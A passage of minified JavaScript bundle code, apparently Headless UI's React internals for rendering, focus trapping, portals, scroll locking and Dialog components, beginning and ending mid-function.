    features: l,
    visible: a = !0,
    name: o,
    mergeRefs: i
}) {
    i = i ?? u1;
    let s = rf(t, e);
    if (a) return wl(s, n, r, o, i);
    let u = l ?? 0;
    if (u & 2) {
        let {
            static: d = !1,
            ...h
        } = s;
        if (d) return wl(h, n, r, o, i)
    }
    if (u & 1) {
        let {
            unmount: d = !0,
            ...h
        } = s;
        return H(d ? 0 : 1, {
            0() {
                return null
            },
            1() {
                return wl({ ...h,
                    hidden: !0,
                    style: {
                        display: "none"
                    }
                }, n, r, o, i)
            }
        })
    }
    return wl(s, n, r, o, i)
}

function wl(e, t = {}, n, r, l) {
    let {
        as: a = n,
        children: o,
        refName: i = "ref",
        ...s
    } = Ja(e, ["unmount", "static"]), u = e.ref !== void 0 ? {
        [i]: e.ref
    } : {}, d = typeof o == "function" ? o(t) : o;
    "className" in s && s.className && typeof s.className == "function" && (s.className = s.className(t));
    let h = {};
    if (t) {
        let v = !1,
            y = [];
        for (let [w, x] of Object.entries(t)) typeof x == "boolean" && (v = !0), x === !0 && y.push(w);
        v && (h["data-headlessui-state"] = y.join(" "))
    }
    if (a === p.Fragment && Object.keys(ju(s)).length > 0) {
        if (!p.isValidElement(d) || Array.isArray(d) && d.length > 1) throw new Error(['Passing props on "Fragment"!', "", `The current component <${r} /> is rendering a "Fragment".`, "However we need to passthrough the following props:", Object.keys(s).map(x => `  - ${x}`).join(`
`), "", "You can apply a few solutions:", ['Add an `as="..."` prop, to ensure that we render an actual element instead of a "Fragment".', "Render a single element as the child so that we can forward the props onto that element."].map(x => `  - ${x}`).join(`
`)].join(`
`));
        let v = d.props,
            y = typeof(v == null ? void 0 : v.className) == "function" ? (...x) => ra(v == null ? void 0 : v.className(...x), s.className) : ra(v == null ? void 0 : v.className, s.className),
            w = y ? {
                className: y
            } : {};
        return p.cloneElement(d, Object.assign({}, rf(d.props, ju(Ja(s, ["ref"]))), h, u, {
            ref: l(d.ref, u.ref)
        }, w))
    }
    return p.createElement(a, Object.assign({}, Ja(s, ["ref"]), a !== p.Fragment && u, a !== p.Fragment && h), d)
}

function nf() {
    let e = p.useRef([]),
        t = p.useCallback(n => {
            for (let r of e.current) r != null && (typeof r == "function" ? r(n) : r.current = n)
        }, []);
    return (...n) => {
        if (!n.every(r => r == null)) return e.current = n, t
    }
}

function u1(...e) {
    return e.every(t => t == null) ? void 0 : t => {
        for (let n of e) n != null && (typeof n == "function" ? n(t) : n.current = t)
    }
}

function rf(...e) {
    if (e.length === 0) return {};
    if (e.length === 1) return e[0];
    let t = {},
        n = {};
    for (let r of e)
        for (let l in r) l.startsWith("on") && typeof r[l] == "function" ? (n[l] != null || (n[l] = []), n[l].push(r[l])) : t[l] = r[l];
    if (t.disabled || t["aria-disabled"]) return Object.assign(t, Object.fromEntries(Object.keys(n).map(r => [r, void 0])));
    for (let r in n) Object.assign(t, {
        [r](l, ...a) {
            let o = n[r];
            for (let i of o) {
                if ((l instanceof Event || (l == null ? void 0 : l.nativeEvent) instanceof Event) && l.defaultPrevented) return;
                i(l, ...a)
            }
        }
    });
    return t
}

function K(e) {
    var t;
    return Object.assign(p.forwardRef(e), {
        displayName: (t = e.displayName) != null ? t : e.name
    })
}

function ju(e) {
    let t = Object.assign({}, e);
    for (let n in t) t[n] === void 0 && delete t[n];
    return t
}

function Ja(e, t = []) {
    let n = Object.assign({}, e);
    for (let r of t) r in n && delete n[r];
    return n
}
let c1 = "div";
var Ur = (e => (e[e.None = 1] = "None", e[e.Focusable = 2] = "Focusable", e[e.Hidden = 4] = "Hidden", e))(Ur || {});

function d1(e, t) {
    var n;
    let {
        features: r = 1,
        ...l
    } = e, a = {
        ref: t,
        "aria-hidden": (r & 2) === 2 ? !0 : (n = l["aria-hidden"]) != null ? n : void 0,
        style: {
            position: "fixed",
            top: 1,
            left: 1,
            width: 1,
            height: 0,
            padding: 0,
            margin: -1,
            overflow: "hidden",
            clip: "rect(0, 0, 0, 0)",
            whiteSpace: "nowrap",
            borderWidth: "0",
            ...(r & 4) === 4 && (r & 2) !== 2 && {
                display: "none"
            }
        }
    };
    return G({
        ourProps: a,
        theirProps: l,
        slot: {},
        defaultTag: c1,
        name: "Hidden"
    })
}
let Br = K(d1),
    ls = p.createContext(null);
ls.displayName = "OpenClosedContext";
var re = (e => (e[e.Open = 1] = "Open", e[e.Closed = 2] = "Closed", e[e.Closing = 4] = "Closing", e[e.Opening = 8] = "Opening", e))(re || {});

function Zr() {
    return p.useContext(ls)
}

function as({
    value: e,
    children: t
}) {
    return $.createElement(ls.Provider, {
        value: e
    }, t)
}

function f1(e) {
    function t() {
        document.readyState !== "loading" && (e(), document.removeEventListener("DOMContentLoaded", t))
    }
    typeof window < "u" && typeof document < "u" && (document.addEventListener("DOMContentLoaded", t), t())
}
let $t = [];
f1(() => {
    function e(t) {
        t.target instanceof HTMLElement && t.target !== document.body && $t[0] !== t.target && ($t.unshift(t.target), $t = $t.filter(n => n != null && n.isConnected), $t.splice(10))
    }
    window.addEventListener("click", e, {
        capture: !0
    }), window.addEventListener("mousedown", e, {
        capture: !0
    }), window.addEventListener("focus", e, {
        capture: !0
    }), document.body.addEventListener("click", e, {
        capture: !0
    }), document.body.addEventListener("mousedown", e, {
        capture: !0
    }), document.body.addEventListener("focus", e, {
        capture: !0
    })
});

function os(e) {
    let t = e.parentElement,
        n = null;
    for (; t && !(t instanceof HTMLFieldSetElement);) t instanceof HTMLLegendElement && (n = t), t = t.parentElement;
    let r = (t == null ? void 0 : t.getAttribute("disabled")) === "";
    return r && p1(n) ? !1 : r
}

function p1(e) {
    if (!e) return !1;
    let t = e.previousElementSibling;
    for (; t !== null;) {
        if (t instanceof HTMLLegendElement) return !1;
        t = t.previousElementSibling
    }
    return !0
}

function m1(e) {
    throw new Error("Unexpected object: " + e)
}
var tt = (e => (e[e.First = 0] = "First", e[e.Previous = 1] = "Previous", e[e.Next = 2] = "Next", e[e.Last = 3] = "Last", e[e.Specific = 4] = "Specific", e[e.Nothing = 5] = "Nothing", e))(tt || {});

function h1(e, t) {
    let n = t.resolveItems();
    if (n.length <= 0) return null;
    let r = t.resolveActiveIndex(),
        l = r ?? -1;
    switch (e.focus) {
        case 0:
            {
                for (let a = 0; a < n.length; ++a)
                    if (!t.resolveDisabled(n[a], a, n)) return a;
                return r
            }
        case 1:
            {
                for (let a = l - 1; a >= 0; --a)
                    if (!t.resolveDisabled(n[a], a, n)) return a;
                return r
            }
        case 2:
            {
                for (let a = l + 1; a < n.length; ++a)
                    if (!t.resolveDisabled(n[a], a, n)) return a;
                return r
            }
        case 3:
            {
                for (let a = n.length - 1; a >= 0; --a)
                    if (!t.resolveDisabled(n[a], a, n)) return a;
                return r
            }
        case 4:
            {
                for (let a = 0; a < n.length; ++a)
                    if (t.resolveId(n[a], a, n) === e.id) return a;
                return r
            }
        case 5:
            return null;
        default:
            m1(e)
    }
}
var M = (e => (e.Space = " ", e.Enter = "Enter", e.Escape = "Escape", e.Backspace = "Backspace", e.Delete = "Delete", e.ArrowLeft = "ArrowLeft", e.ArrowUp = "ArrowUp", e.ArrowRight = "ArrowRight", e.ArrowDown = "ArrowDown", e.Home = "Home", e.End = "End", e.PageUp = "PageUp", e.PageDown = "PageDown", e.Tab = "Tab", e))(M || {});

function lf(e, t, n, r) {
    let l = He(n);
    p.useEffect(() => {
        e = e ?? window;

        function a(o) {
            l.current(o)
        }
        return e.addEventListener(t, a, r), () => e.removeEventListener(t, a, r)
    }, [e, t, r])
}

function Jn() {
    let e = p.useRef(!1);
    return te(() => (e.current = !0, () => {
        e.current = !1
    }), []), e
}

function af(e) {
    let t = _(e),
        n = p.useRef(!1);
    p.useEffect(() => (n.current = !1, () => {
        n.current = !0, Gr(() => {
            n.current && t()
        })
    }), [t])
}
var mr = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(mr || {});

function v1() {
    let e = p.useRef(0);
    return Jd("keydown", t => {
        t.key === "Tab" && (e.current = t.shiftKey ? 1 : 0)
    }, !0), e
}

function of (e) {
    if (!e) return new Set;
    if (typeof e == "function") return new Set(e());
    let t = new Set;
    for (let n of e.current) n.current instanceof HTMLElement && t.add(n.current);
    return t
}
let g1 = "div";
var sf = (e => (e[e.None = 1] = "None", e[e.InitialFocus = 2] = "InitialFocus", e[e.TabLock = 4] = "TabLock", e[e.FocusLock = 8] = "FocusLock", e[e.RestoreFocus = 16] = "RestoreFocus", e[e.All = 30] = "All", e))(sf || {});

function y1(e, t) {
    let n = p.useRef(null),
        r = q(n, t),
        {
            initialFocus: l,
            containers: a,
            features: o = 30,
            ...i
        } = e;
    Gn() || (o = 1);
    let s = Zn(n);
    k1({
        ownerDocument: s
    }, !!(o & 16));
    let u = b1({
        ownerDocument: s,
        container: n,
        initialFocus: l
    }, !!(o & 2));
    S1({
        ownerDocument: s,
        container: n,
        containers: a,
        previousActiveElement: u
    }, !!(o & 8));
    let d = v1(),
        h = _(x => {
            let b = n.current;
            b && (f => f())(() => {
                H(d.current, {
                    [mr.Forwards]: () => {
                        et(b, oe.First, {
                            skipElements: [x.relatedTarget]
                        })
                    },
                    [mr.Backwards]: () => {
                        et(b, oe.Last, {
                            skipElements: [x.relatedTarget]
                        })
                    }
                })
            })
        }),
        v = Xr(),
        y = p.useRef(!1),
        w = {
            ref: r,
            onKeyDown(x) {
                x.key == "Tab" && (y.current = !0, v.requestAnimationFrame(() => {
                    y.current = !1
                }))
            },
            onBlur(x) {
                let b = of (a);
                n.current instanceof HTMLElement && b.add(n.current);
                let f = x.relatedTarget;
                f instanceof HTMLElement && f.dataset.headlessuiFocusGuard !== "true" && (uf(b, f) || (y.current ? et(n.current, H(d.current, {
                    [mr.Forwards]: () => oe.Next,
                    [mr.Backwards]: () => oe.Previous
                }) | oe.WrapAround, {
                    relativeTo: x.target
                }) : x.target instanceof HTMLElement && Ht(x.target)))
            }
        };
    return $.createElement($.Fragment, null, !!(o & 4) && $.createElement(Br, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: h,
        features: Ur.Focusable
    }), G({
        ourProps: w,
        theirProps: i,
        defaultTag: g1,
        name: "FocusTrap"
    }), !!(o & 4) && $.createElement(Br, {
        as: "button",
        type: "button",
        "data-headlessui-focus-guard": !0,
        onFocus: h,
        features: Ur.Focusable
    }))
}
let w1 = K(y1),
    ir = Object.assign(w1, {
        features: sf
    });

function x1(e = !0) {
    let t = p.useRef($t.slice());
    return rs(([n], [r]) => {
        r === !0 && n === !1 && Gr(() => {
            t.current.splice(0)
        }), r === !1 && n === !0 && (t.current = $t.slice())
    }, [e, $t, t]), _(() => {
        var n;
        return (n = t.current.find(r => r != null && r.isConnected)) != null ? n : null
    })
}

function k1({
    ownerDocument: e
}, t) {
    let n = x1(t);
    rs(() => {
        t || (e == null ? void 0 : e.activeElement) === (e == null ? void 0 : e.body) && Ht(n())
    }, [t]), af(() => {
        t && Ht(n())
    })
}

function b1({
    ownerDocument: e,
    container: t,
    initialFocus: n
}, r) {
    let l = p.useRef(null),
        a = Jn();
    return rs(() => {
        if (!r) return;
        let o = t.current;
        o && Gr(() => {
            if (!a.current) return;
            let i = e == null ? void 0 : e.activeElement;
            if (n != null && n.current) {
                if ((n == null ? void 0 : n.current) === i) {
                    l.current = i;
                    return
                }
            } else if (o.contains(i)) {
                l.current = i;
                return
            }
            n != null && n.current ? Ht(n.current) : et(o, oe.First) === Ln.Error && console.warn("There are no focusable elements inside the <FocusTrap />"), l.current = e == null ? void 0 : e.activeElement
        })
    }, [r]), l
}

function S1({
    ownerDocument: e,
    container: t,
    containers: n,
    previousActiveElement: r
}, l) {
    let a = Jn();
    lf(e == null ? void 0 : e.defaultView, "focus", o => {
        if (!l || !a.current) return;
        let i = of (n);
        t.current instanceof HTMLElement && i.add(t.current);
        let s = r.current;
        if (!s) return;
        let u = o.target;
        u && u instanceof HTMLElement ? uf(i, u) ? (r.current = u, Ht(u)) : (o.preventDefault(), o.stopPropagation(), Ht(s)) : Ht(r.current)
    }, !0)
}

function uf(e, t) {
    for (let n of e)
        if (n.contains(t)) return !0;
    return !1
}
let cf = p.createContext(!1);

function E1() {
    return p.useContext(cf)
}

function ei(e) {
    return $.createElement(cf.Provider, {
        value: e.force
    }, e.children)
}

function N1(e) {
    let t = E1(),
        n = p.useContext(df),
        r = Zn(e),
        [l, a] = p.useState(() => {
            if (!t && n !== null || wt.isServer) return null;
            let o = r == null ? void 0 : r.getElementById("headlessui-portal-root");
            if (o) return o;
            if (r === null) return null;
            let i = r.createElement("div");
            return i.setAttribute("id", "headlessui-portal-root"), r.body.appendChild(i)
        });
    return p.useEffect(() => {
        l !== null && (r != null && r.body.contains(l) || r == null || r.body.appendChild(l))
    }, [l, r]), p.useEffect(() => {
        t || n !== null && a(n.current)
    }, [n, a, t]), l
}
let C1 = p.Fragment;

function P1(e, t) {
    let n = e,
        r = p.useRef(null),
        l = q(tf(d => {
            r.current = d
        }), t),
        a = Zn(r),
        o = N1(r),
        [i] = p.useState(() => {
            var d;
            return wt.isServer ? null : (d = a == null ? void 0 : a.createElement("div")) != null ? d : null
        }),
        s = p.useContext(ti),
        u = Gn();
    return te(() => {
        !o || !i || o.contains(i) || (i.setAttribute("data-headlessui-portal", ""), o.appendChild(i))
    }, [o, i]), te(() => {
        if (i && s) return s.register(i)
    }, [s, i]), af(() => {
        var d;
        !o || !i || (i instanceof Node && o.contains(i) && o.removeChild(i), o.childNodes.length <= 0 && ((d = o.parentElement) == null || d.removeChild(o)))
    }), u ? !o || !i ? null : Yd.createPortal(G({
        ourProps: {
            ref: l
        },
        theirProps: n,
        defaultTag: C1,
        name: "Portal"
    }), i) : null
}
let T1 = p.Fragment,
    df = p.createContext(null);

function j1(e, t) {
    let {
        target: n,
        ...r
    } = e, l = {
        ref: q(t)
    };
    return $.createElement(df.Provider, {
        value: n
    }, G({
        ourProps: l,
        theirProps: r,
        defaultTag: T1,
        name: "Popover.Group"
    }))
}
let ti = p.createContext(null);

function L1() {
    let e = p.useContext(ti),
        t = p.useRef([]),
        n = _(a => (t.current.push(a), e && e.register(a), () => r(a))),
        r = _(a => {
            let o = t.current.indexOf(a);
            o !== -1 && t.current.splice(o, 1), e && e.unregister(a)
        }),
        l = p.useMemo(() => ({
            register: n,
            unregister: r,
            portals: t
        }), [n, r, t]);
    return [t, p.useMemo(() => function({
        children: a
    }) {
        return $.createElement(ti.Provider, {
            value: l
        }, a)
    }, [l])]
}
let $1 = K(P1),
    _1 = K(j1),
    ni = Object.assign($1, {
        Group: _1
    });

function R1(e, t) {
    return e === t && (e !== 0 || 1 / e === 1 / t) || e !== e && t !== t
}
const F1 = typeof Object.is == "function" ? Object.is : R1,
    {
        useState: I1,
        useEffect: D1,
        useLayoutEffect: M1,
        useDebugValue: O1
    } = Er;

function z1(e, t, n) {
    const r = t(),
        [{
            inst: l
        }, a] = I1({
            inst: {
                value: r,
                getSnapshot: t
            }
        });
    return M1(() => {
        l.value = r, l.getSnapshot = t, qa(l) && a({
            inst: l
        })
    }, [e, r, t]), D1(() => (qa(l) && a({
        inst: l
    }), e(() => {
        qa(l) && a({
            inst: l
        })
    })), [e]), O1(r), r
}

function qa(e) {
    const t = e.getSnapshot,
        n = e.value;
    try {
        const r = t();
        return !F1(n, r)
    } catch {
        return !0
    }
}

function A1(e, t, n) {
    return t()
}
const W1 = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u",
    U1 = !W1,
    B1 = U1 ? A1 : z1,
    H1 = "useSyncExternalStore" in Er ? (e => e.useSyncExternalStore)(Er) : B1;

function V1(e) {
    return H1(e.subscribe, e.getSnapshot, e.getSnapshot)
}

function Q1(e, t) {
    let n = e(),
        r = new Set;
    return {
        getSnapshot() {
            return n
        },
        subscribe(l) {
            return r.add(l), () => r.delete(l)
        },
        dispatch(l, ...a) {
            let o = t[l].call(n, ...a);
            o && (n = o, r.forEach(i => i()))
        }
    }
}

function K1() {
    let e;
    return {
        before({
            doc: t
        }) {
            var n;
            let r = t.documentElement;
            e = ((n = t.defaultView) != null ? n : window).innerWidth - r.clientWidth
        },
        after({
            doc: t,
            d: n
        }) {
            let r = t.documentElement,
                l = r.clientWidth - r.offsetWidth,
                a = e - l;
            n.style(r, "paddingRight", `${a}px`)
        }
    }
}

function Y1() {
    return Zd() ? {
        before({
            doc: e,
            d: t,
            meta: n
        }) {
            function r(l) {
                return n.containers.flatMap(a => a()).some(a => a.contains(l))
            }
            t.microTask(() => {
                var l;
                if (window.getComputedStyle(e.documentElement).scrollBehavior !== "auto") {
                    let i = at();
                    i.style(e.documentElement, "scrollBehavior", "auto"), t.add(() => t.microTask(() => i.dispose()))
                }
                let a = (l = window.scrollY) != null ? l : window.pageYOffset,
                    o = null;
                t.addEventListener(e, "click", i => {
                    if (i.target instanceof HTMLElement) try {
                        let s = i.target.closest("a");
                        if (!s) return;
                        let {
                            hash: u
                        } = new URL(s.href), d = e.querySelector(u);
                        d && !r(d) && (o = d)
                    } catch {}
                }, !0), t.addEventListener(e, "touchstart", i => {
                    if (i.target instanceof HTMLElement)
                        if (r(i.target)) {
                            let s = i.target;
                            for (; s.parentElement && r(s.parentElement);) s = s.parentElement;
                            t.style(s, "overscrollBehavior", "contain")
                        } else t.style(i.target, "touchAction", "none")
                }), t.addEventListener(e, "touchmove", i => {
                    if (i.target instanceof HTMLElement)
                        if (r(i.target)) {
                            let s = i.target;
                            for (; s.parentElement && s.dataset.headlessuiPortal !== "" && !(s.scrollHeight > s.clientHeight || s.scrollWidth > s.clientWidth);) s = s.parentElement;
                            s.dataset.headlessuiPortal === "" && i.preventDefault()
                        } else i.preventDefault()
                }, {
                    passive: !1
                }), t.add(() => {
                    var i;
                    let s = (i = window.scrollY) != null ? i : window.pageYOffset;
                    a !== s && window.scrollTo(0, a), o && o.isConnected && (o.scrollIntoView({
                        block: "nearest"
                    }), o = null)
                })
            })
        }
    } : {}
}

function G1() {
    return {
        before({
            doc: e,
            d: t
        }) {
            t.style(e.documentElement, "overflow", "hidden")
        }
    }
}

function X1(e) {
    let t = {};
    for (let n of e) Object.assign(t, n(t));
    return t
}
let an = Q1(() => new Map, {
    PUSH(e, t) {
        var n;
        let r = (n = this.get(e)) != null ? n : {
            doc: e,
            count: 0,
            d: at(),
            meta: new Set
        };
        return r.count++, r.meta.add(t), this.set(e, r), this
    },
    POP(e, t) {
        let n = this.get(e);
        return n && (n.count--, n.meta.delete(t)), this
    },
    SCROLL_PREVENT({
        doc: e,
        d: t,
        meta: n
    }) {
        let r = {
                doc: e,
                d: t,
                meta: X1(n)
            },
            l = [Y1(), K1(), G1()];
        l.forEach(({
            before: a
        }) => a == null ? void 0 : a(r)), l.forEach(({
            after: a
        }) => a == null ? void 0 : a(r))
    },
    SCROLL_ALLOW({
        d: e
    }) {
        e.dispose()
    },
    TEARDOWN({
        doc: e
    }) {
        this.delete(e)
    }
});
an.subscribe(() => {
    let e = an.getSnapshot(),
        t = new Map;
    for (let [n] of e) t.set(n, n.documentElement.style.overflow);
    for (let n of e.values()) {
        let r = t.get(n.doc) === "hidden",
            l = n.count !== 0;
        (l && !r || !l && r) && an.dispatch(n.count > 0 ? "SCROLL_PREVENT" : "SCROLL_ALLOW", n), n.count === 0 && an.dispatch("TEARDOWN", n)
    }
});

function Z1(e, t, n) {
    let r = V1(an),
        l = e ? r.get(e) : void 0,
        a = l ? l.count > 0 : !1;
    return te(() => {
        if (!(!e || !t)) return an.dispatch("PUSH", e, n), () => an.dispatch("POP", e, n)
    }, [t, e]), a
}
let eo = new Map,
    sr = new Map;

function Lu(e, t = !0) {
    te(() => {
        var n;
        if (!t) return;
        let r = typeof e == "function" ? e() : e.current;
        if (!r) return;

        function l() {
            var o;
            if (!r) return;
            let i = (o = sr.get(r)) != null ? o : 1;
            if (i === 1 ? sr.delete(r) : sr.set(r, i - 1), i !== 1) return;
            let s = eo.get(r);
            s && (s["aria-hidden"] === null ? r.removeAttribute("aria-hidden") : r.setAttribute("aria-hidden", s["aria-hidden"]), r.inert = s.inert, eo.delete(r))
        }
        let a = (n = sr.get(r)) != null ? n : 0;
        return sr.set(r, a + 1), a !== 0 || (eo.set(r, {
            "aria-hidden": r.getAttribute("aria-hidden"),
            inert: r.inert
        }), r.setAttribute("aria-hidden", "true"), r.inert = !0), l
    }, [e, t])
}

function J1({
    defaultContainers: e = [],
    portals: t,
    mainTreeNodeRef: n
} = {}) {
    var r;
    let l = p.useRef((r = n == null ? void 0 : n.current) != null ? r : null),
        a = Zn(l),
        o = _(() => {
            var i, s, u;
            let d = [];
            for (let h of e) h !== null && (h instanceof HTMLElement ? d.push(h) : "current" in h && h.current instanceof HTMLElement && d.push(h.current));
            if (t != null && t.current)
                for (let h of t.current) d.push(h);
            for (let h of (i = a == null ? void 0 : a.querySelectorAll("html > *, body > *")) != null ? i : []) h !== document.body && h !== document.head && h instanceof HTMLElement && h.id !== "headlessui-portal-root" && (h.contains(l.current) || h.contains((u = (s = l.current) == null ? void 0 : s.getRootNode()) == null ? void 0 : u.host) || d.some(v => h.contains(v)) || d.push(h));
            return d
        });
    return {
        resolveContainers: o,
        contains: _(i => o().some(s => s.contains(i))),
        mainTreeNodeRef: l,
        MainTreeNode: p.useMemo(() => function() {
            return n != null ? null : $.createElement(Br, {
                features: Ur.Hidden,
                ref: l
            })
        }, [l, n])
    }
}
let is = p.createContext(() => {});
is.displayName = "StackContext";
var ri = (e => (e[e.Add = 0] = "Add", e[e.Remove = 1] = "Remove", e))(ri || {});

function q1() {
    return p.useContext(is)
}

function e0({
    children: e,
    onUpdate: t,
    type: n,
    element: r,
    enabled: l
}) {
    let a = q1(),
        o = _((...i) => {
            t == null || t(...i), a(...i)
        });
    return te(() => {
        let i = l === void 0 || l === !0;
        return i && o(0, n, r), () => {
            i && o(1, n, r)
        }
    }, [o, n, r, l]), $.createElement(is.Provider, {
        value: o
    }, e)
}
let ff = p.createContext(null);

function pf() {
    let e = p.useContext(ff);
    if (e === null) {
        let t = new Error("You used a <Description /> component, but it is not inside a relevant parent.");
        throw Error.captureStackTrace && Error.captureStackTrace(t, pf), t
    }
    return e
}

function t0() {
    let [e, t] = p.useState([]);
    return [e.length > 0 ? e.join(" ") : void 0, p.useMemo(() => function(n) {
        let r = _(a => (t(o => [...o, a]), () => t(o => {
                let i = o.slice(),
                    s = i.indexOf(a);
                return s !== -1 && i.splice(s, 1), i
            }))),
            l = p.useMemo(() => ({
                register: r,
                slot: n.slot,
                name: n.name,
                props: n.props
            }), [r, n.slot, n.name, n.props]);
        return $.createElement(ff.Provider, {
            value: l
        }, n.children)
    }, [t])]
}
let n0 = "p";

function r0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-description-${n}`,
            ...l
        } = e,
        a = pf(),
        o = q(t);
    te(() => a.register(r), [r, a.register]);
    let i = {
        ref: o,
        ...a.props,
        id: r
    };
    return G({
        ourProps: i,
        theirProps: l,
        slot: a.slot || {},
        defaultTag: n0,
        name: a.name || "Description"
    })
}
let l0 = K(r0),
    a0 = Object.assign(l0, {});
var o0 = (e => (e[e.Open = 0] = "Open", e[e.Closed = 1] = "Closed", e))(o0 || {}),
    i0 = (e => (e[e.SetTitleId = 0] = "SetTitleId", e))(i0 || {});
let s0 = {
        0(e, t) {
            return e.titleId === t.id ? e : { ...e,
                titleId: t.id
            }
        }
    },
    la = p.createContext(null);
la.displayName = "DialogContext";

function Jr(e) {
    let t = p.useContext(la);
    if (t === null) {
        let n = new Error(`<${e} /> is missing a parent <Dialog /> component.`);
        throw Error.captureStackTrace && Error.captureStackTrace(n, Jr), n
    }
    return t
}

function u0(e, t, n = () => [document.body]) {
    Z1(e, t, r => {
        var l;
        return {
            containers: [...(l = r.containers) != null ? l : [], n]
        }
    })
}

function c0(e, t) {
    return H(t.type, s0, e, t)
}
let d0 = "div",
    f0 = dt.RenderStrategy | dt.Static;

function p0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-dialog-${n}`,
            open: l,
            onClose: a,
            initialFocus: o,
            role: i = "dialog",
            __demoMode: s = !1,
            ...u
        } = e,
        [d, h] = p.useState(0),
        v = p.useRef(!1);
    i = function() {
        return i === "dialog" || i === "alertdialog" ? i : (v.current || (v.current = !0, console.warn(`Invalid role [${i}] passed to <Dialog />. Only \`dialog\` and and \`alertdialog\` are supported. Using \`dialog\` instead.`)), "dialog")
    }();
    let y = Zr();
    l === void 0 && y !== null && (l = (y & re.Open) === re.Open);
    let w = p.useRef(null),
        x = q(w, t),
        b = Zn(w),
        f = e.hasOwnProperty("open") || y !== null,
        c = e.hasOwnProperty("onClose");
    if (!f && !c) throw new Error("You have to provide an `open` and an `onClose` prop to the `Dialog` component.");
    if (!f) throw new Error("You provided an `onClose` prop to the `Dialog`, but forgot an `open` prop.");
    if (!c) throw new Error("You provided an `open` prop to the `Dialog`, but forgot an `onClose` prop.");
    if (typeof l != "boolean") throw new Error(`You provided an \`open\` prop to the \`Dialog\`, but the value is not a boolean. Received: ${l}`);
    if (typeof a != "function") throw new Error(`You provided an \`onClose\` prop to the \`Dialog\`, but the value is not a function. Received: ${a}`);
    let m = l ? 0 : 1,
        [k, S] = p.useReducer(c0, {
            titleId: null,
            descriptionId: null,
            panelRef: p.createRef()
        }),
        N = _(() => a(!1)),
        P = _(le => S({
            type: 0,
            id: le
        })),
        C = Gn() ? s ? !1 : m === 0 : !1,
        I = d > 1,
        T = p.useContext(la) !== null,
        [A, fe] = L1(),
        Le = {
            get current() {
                var le;
                return (le = k.panelRef.current) != null ? le : w.current
            }
        },
        {
            resolveContainers: Ke,
            mainTreeNodeRef: Ye,
            MainTreeNode: Xt
        } = J1({
            portals: A,
            defaultContainers: [Le]
        }),
        Ge = I ? "parent" : "leaf",
        j = y !== null ? (y & re.Closing) === re.Closing : !1,
        R = T || j ? !1 : C,
        F = p.useCallback(() => {
            var le, pt;
            return (pt = Array.from((le = b == null ? void 0 : b.querySelectorAll("body > *")) != null ? le : []).find(ze => ze.id === "headlessui-portal-root" ? !1 : ze.contains(Ye.current) && ze instanceof HTMLElement)) != null ? pt : null
        }, [Ye]);
    Lu(F, R);
    let W = I ? !0 : C,
        U = p.useCallback(() => {
            var le, pt;
            return (pt = Array.from((le = b == null ? void 0 : b.querySelectorAll("[data-headlessui-portal]")) != null ? le : []).find(ze => ze.contains(Ye.current) && ze instanceof HTMLElement)) != null ? pt : null
        }, [Ye]);
    Lu(U, W), qd(Ke, N, !(!C || I));
    let ue = !(I || m !== 0);
    lf(b == null ? void 0 : b.defaultView, "keydown", le => {
        ue && (le.defaultPrevented || le.key === M.Escape && (le.preventDefault(), le.stopPropagation(), N()))
    }), u0(b, !(j || m !== 0 || T), Ke), p.useEffect(() => {
        if (m !== 0 || !w.current) return;
        let le = new ResizeObserver(pt => {
            for (let ze of pt) {
                let el = ze.target.getBoundingClientRect();
                el.x === 0 && el.y === 0 && el.width === 0 && el.height === 0 && N()
            }
        });
        return le.observe(w.current), () => le.disconnect()
    }, [m, w, N]);
    let [ft, vn] = t0(), kf = p.useMemo(() => [{
        dialogState: m,
        close: N,
        setTitleId: P
    }, k], [m, k, N, P]), vs = p.useMemo(() => ({
        open: m === 0
    }), [m]), bf = {
        ref: x,
        id: r,
        role: i,
        "aria-modal": m === 0 ? !0 : void 0,
        "aria-labelledby": k.titleId,
        "aria-describedby": ft
    };
    return $.createElement(e0, {
        type: "Dialog",
        enabled: m === 0,
        element: w,
        onUpdate: _((le, pt) => {
            pt === "Dialog" && H(le, {
                [ri.Add]: () => h(ze => ze + 1),
                [ri.Remove]: () => h(ze => ze - 1)
            })
        })
    }, $.createElement(ei, {
        force: !0
    }, $.createElement(ni, null, $.createElement(la.Provider, {
        value: kf
    }, $.createElement(ni.Group, {
        target: w
    }, $.createElement(ei, {
        force: !1
    }, $.createElement(vn, {
        slot: vs,
        name: "Dialog.Description"
    }, $.createElement(ir, {
        initialFocus: o,
        containers: Ke,
        features: C ? H(Ge, {
            parent: ir.features.RestoreFocus,
            leaf: ir.features.All & ~ir.features.FocusLock
        }) : ir.features.None
    }, $.createElement(fe, null, G({
        ourProps: bf,
        theirProps: u,
        slot: vs,
        defaultTag: d0,
        features: f0,
        visible: m === 0,
        name: "Dialog"
    }))))))))), $.createElement(Xt, null))
}
let m0 = "div";

function h0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-dialog-overlay-${n}`,
            ...l
        } = e,
        [{
            dialogState: a,
            close: o
        }] = Jr("Dialog.Overlay"),
        i = q(t),
        s = _(d => {
            if (d.target === d.currentTarget) {
                if (os(d.currentTarget)) return d.preventDefault();
                d.preventDefault(), d.stopPropagation(), o()
            }
        }),
        u = p.useMemo(() => ({
            open: a === 0
        }), [a]);
    return G({
        ourProps: {
            ref: i,
            id: r,
            "aria-hidden": !0,
            onClick: s
        },
        theirProps: l,
        slot: u,
        defaultTag: m0,
        name: "Dialog.Overlay"
    })
}
let v0 = "div";

function g0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-dialog-backdrop-${n}`,
            ...l
        } = e,
        [{
            dialogState: a
        }, o] = Jr("Dialog.Backdrop"),
        i = q(t);
    p.useEffect(() => {
        if (o.panelRef.current === null) throw new Error("A <Dialog.Backdrop /> component is being used, but a <Dialog.Panel /> component is missing.")
    }, [o.panelRef]);
    let s = p.useMemo(() => ({
        open: a === 0
    }), [a]);
    return $.createElement(ei, {
        force: !0
    }, $.createElement(ni, null, G({
        ourProps: {
            ref: i,
            id: r,
            "aria-hidden": !0
        },
        theirProps: l,
        slot: s,
        defaultTag: v0,
        name: "Dialog.Backdrop"
    })))
}
let y0 = "div";

function w0(e, t) {
    let n = Oe(),
        {
            id: r = `headlessui-dialog-panel-${n}`,
            ...l
        } = e,
        [{
